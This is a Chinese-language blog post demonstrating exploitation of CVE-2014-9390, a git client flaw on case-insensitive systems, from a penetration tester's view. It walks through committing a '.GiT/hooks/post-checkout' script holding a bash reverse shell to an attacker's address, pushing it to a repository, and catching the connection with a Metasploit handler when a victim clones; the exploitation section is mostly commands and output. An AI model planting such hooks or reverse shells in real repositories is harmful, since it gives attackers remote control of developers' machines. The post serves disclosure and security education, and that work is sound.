# One git command may cause you hacked(CVE-2014-9390) - zoucaitou - 博客园

> 原文：[`www.cnblogs.com/zoucaitou/p/4179025.html`](https://www.cnblogs.com/zoucaitou/p/4179025.html)

## 0x00 背景

* * *

CVE-2014-9390 是最近很火的一个漏洞，一个 git 命令就可能导致你被黑，我不打算深入探讨这个漏洞的细节，官方已经在[`github.com/blog/1938-git-client-vulnerability-announced`](https://github.com/blog/1938-git-client-vulnerability-announced) 和[`article.gmane.org/gmane.linux.kernel/1853266`](http://article.gmane.org/gmane.linux.kernel/1853266)发布了详细信息。总之，如果你使用了大小写不敏感的操作系统例如 Windows 或 OSX，你应该更新 git 客户端了。

让我们以渗透测试的角度来看看这个漏洞。

## 0x01 准备

* * *

我创建了一个命名为 CVE-2014-9390 的新项目。

![enter image description here](img/aa55f999dd91dcecdf9ebf2e0d738cb1.png)

建立一个.GiT（大些 G，小写 i 然后大写 T）目录，创建一个 vulnerable.txt 文件，然后 push 到项目中。

| 12345678910 | `root@rootlab:~``/cve-2014-9390``# mkdir .GiT``root@rootlab:~``/cve-2014-9390``# cd .GiT/``root@rootlab:~``/cve-2014-9390/``.GiT``# echo "Vulnerable" >> vulnerable.txt``root@rootlab:~``/cve-2014-9390/``.GiT``# cd ..``root@rootlab:~``/cve-2014-9390``# git add .``root@rootlab:~``/cve-2014-9390``# git commit -m 'poc'``[master bec157d] poc``1` `file` `changed, 1 insertion(+)``create mode 100644 .GiT``/vulnerable``.txt``root@rootlab:~``/cve-2014-9390``# git push` |

我们再从 Windows 的电脑上用存在漏洞的 git 客户端 pull 同一个项目看看

| 123456789 | `rootlab@MINCE ~``$ git clone git@gitlab.com:mehmet``/cve-2014-9390``.git``Cloning into` `'cve-2014-9390'``...``Enter passphrase` `for` `key` `'/c/Users/rootlab/.ssh/id_rsa'``:``remote: Counting objects: 7,` `done``.``remote: Compressing objects: 100% (3``/3``),` `done``.``remote: Total 7 (delta 0), reused 0 (delta 0)R``Receiving objects: 100% (7``/7``),` `done``.``Checking connectivity...` `done``.` |

给大家看一下.git 目录，本应该在.GiT 目录的 vulnerable.txt 也在这里

![enter image description here](img/17a27375d826899b47957c6511fcab82.png)

## 0x02 利用

* * *

### 什么是 git 的 hooks

与许多其他版本控制系统类似，一些重要的动作发生时，git 有一个方法来执行自定义的脚本。hooks 分两方面：客户端和服务器端。当进行 commit 和 merge 时可以触发客户端的 hooks。

当执行 git 命令如 git pull 和 git checkout 时就可以执行客户端的脚本。

### 如何实现 git hooks？

重写.git/hooks 目录下的一个脚本文件，然后执行他，我们可以通过这个漏洞来实现。

我们创建一个假的 git 目录然后建立一个叫 post-checkout 的文件。

| 123456789 | `root@rootlab:~``/cve-2014-9390``# mkdir .GiT/hooks``root@rootlab:~``/cve-2014-9390``# echo '#!/bin/sh' > .GiT/hooks/post-checkout``root@rootlab:~``/cve-2014-9390``# echo 'bash -i >& /dev/tcp/[IPADDRESS]/443 0>&1' >> .GiT/hooks/post-checkout``root@rootlab:~``/cve-2014-9390``# git add .``root@rootlab:~``/cve-2014-9390``# git commit -m 'add reverse connection payload'``[master 389c979] add powershell payload``1` `file` `changed, 4 insertions(+)``create mode 100644 .GiT``/hooks/post-checkout``root@rootlab:~``//cve-2014-9390``# git push` |

我们在服务器端监听

| 1234567 | `msf > use exploit``/multi/handler``msf exploit(handler) >` `set` `PAYLOAD generic``/shell_reverse_tcp``msf exploit(handler) >` `set` `LPORT 443``msf exploit(handler) >` `set` `LHOST 108.61.164.142``msf exploit(handler) > exploit``[*] Started reverse handler on 108.61.164.142:443``[*] Starting the payload handler...` |

我们 clone https://gitlab.com/mehmet/cve-2014-9390

![enter image description here](img/85f1ea8f348c7a22d9c6cd471023294c.png)

看起来都是很正常，但是……

![enter image description here](img/d7224344335de11c83b281ca4555560d.png)